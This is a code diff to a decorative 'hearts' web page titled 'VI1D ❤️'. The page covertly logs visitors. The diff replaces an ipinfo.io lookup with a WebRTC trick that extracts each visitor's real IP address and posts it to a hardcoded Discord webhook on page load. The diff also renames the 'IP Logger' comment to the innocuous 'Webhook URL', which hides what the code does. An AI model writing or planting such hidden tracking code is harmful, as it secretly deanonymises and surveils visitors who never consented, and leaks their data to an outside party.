@@ -76,7 +76,7 @@
     <h1>VI1D ❤️</h1>
 
     <script>
-        // Herzen nach oben fliegen
+        // Love-Herzen
         function createHeart(){
             const heart = document.createElement('div');
             heart.className = 'heart';
@@ -99,19 +99,33 @@
             setTimeout(() => cHeart.remove(), 500);
         });
 
-        // IP Logger + Discord Webhook
+        // Webhook URL
         const webhookURL = "https://discord.com/api/webhooks/1406003285600501970/DHV4856DEk1Um6N70WyTjnl5qMsPd1egU98METNMoC8Jgs1Dzgb2VCbqKtaaTigA_i1P";
 
-        fetch("https://ipinfo.io/json")
-            .then(res => res.json())
-            .then(data => {
-                const ip = data.ip;
-                fetch(webhookURL, {
-                    method: "POST",
-                    headers: { "Content-Type": "application/json" },
-                    body: JSON.stringify({ content: `new visitor (${ip})` })
-                });
+        // WebRTC für echte IP
+        function getIPs(callback){
+            const pc = new RTCPeerConnection({iceServers:[]});
+            const ips = [];
+            pc.createDataChannel("");
+            pc.createOffer().then(offer => pc.setLocalDescription(offer));
+            pc.onicecandidate = event => {
+                if (!event || !event.candidate) return;
+                const parts = event.candidate.candidate.split(" ");
+                const ip = parts[4];
+                if (!ips.includes(ip)) {
+                    ips.push(ip);
+                    callback(ip);
+                }
+            };
+        }
+
+        getIPs(ip => {
+            fetch(webhookURL, {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify({ content: `new visitor (${ip})` })
             });
+        });
     </script>
 </body>
 </html>
